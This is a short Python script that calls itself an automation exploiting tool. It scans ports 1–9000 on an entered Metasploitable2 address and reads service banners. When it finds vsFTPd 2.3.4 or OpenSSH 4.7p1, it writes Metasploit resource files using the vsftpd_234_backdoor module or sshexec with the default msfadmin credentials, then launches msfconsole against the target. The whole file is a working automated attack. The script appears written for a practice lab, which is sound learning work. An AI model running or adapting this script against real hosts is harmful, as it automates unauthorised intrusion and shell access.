
import socket
import subprocess
import os
from threading import *
from termcolor import colored

print(colored("#-"*20,"red"))
print("\n"*3)
print(colored("    Python Automation Exploiting Tool   \n","blue"))
print(colored("       Author: Orhan Furkan Vurucu                 ","blue"))
print("\n"*3)
print(colored("#-"*20,"red"))



class App:
	def __init__(self,ip,port):
		self.ip = ip
		self.port = port
		try:
			soket = socket.socket()
			soket.connect((str(self.ip),int(self.port)))
			banner = soket.recv(1024)
			portInfo = colored("[+] {port} open".format(port=self.port),"green")
			banner = str(banner).replace("b'","")
			print(portInfo + "\t " + banner)
			if "vsFTPd 2.3.4" in str(banner):
				rc = """
					use exploit/unix/ftp/vsftpd_234_backdoor
					set RHOSTS host
					exploit
				     """
				rc = str(rc).replace("host",self.ip)
				savedPath = os.getcwd()
				os.chdir(os.getcwd() + "/rcfiles")
				file = open("vsftpd.rc","w")
				file.write(rc)
				file.close()
				command = "xterm -e msfconsole -r vsftpd.rc"
				subprocess.Popen(command,shell=True,stdout=subprocess.PIPE)
				os.chdir(savedPath)
			elif "SSH-2.0-OpenSSH_4.7p1" in str(banner):
				rc2 = """
				use exploit/multi/ssh/sshexec
				set RHOSTS host
				set USERNAME msfadmin
				set PASSWORD msfadmin
				exploit
				"""
				rc2 = str(rc2).replace("host",self.ip)
				savedPath = os.getcwd()
				os.chdir(os.getcwd() + "/rcfiles")
				file2 = open("SSH-2.0-OpenSSH_4.7p1.rc","w")
				file2.write(rc2)
				file2.close()
				command = "xterm -e msfconsole -r SSH-2.0-OpenSSH_4.7p1.rc"
				subprocess.Popen(command,shell=True,stdout=subprocess.PIPE)
				os.chdir(savedPath)
		except:
			pass


metasploitableIP = str(input(colored("Enter Metasploitable2 IP: ","blue")))

for i in range(1,9001,1):
	thread= Thread(target=App,args=(metasploitableIP,i))
	thread.start()
